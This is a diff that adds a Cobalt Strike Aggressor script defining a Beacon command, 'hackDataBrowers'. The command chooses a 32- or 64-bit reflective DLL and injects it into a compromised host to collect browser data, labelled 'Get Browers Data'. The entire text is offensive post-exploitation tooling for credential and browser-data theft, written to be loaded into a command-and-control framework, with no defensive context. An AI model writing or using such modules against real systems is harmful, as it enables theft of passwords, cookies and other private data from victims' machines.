@@ -1,0 +1,12 @@
+alias hackDataBrowers {
+	local('$dll');
+	btask($1, "Task Beacon to run HackDataBrowers", "T9999");
+	if (-is64 $1) {
+		$dll    = getFileProper(script_resource("resources"), "reflective_dll.x64.dll");
+	}
+	else {
+		$dll    = getFileProper(script_resource("resources"), "reflective_dll.dll");
+	}
+	bdllspawn($1, $dll , $2, "Get Browers Data", 5000, false);
+
+}
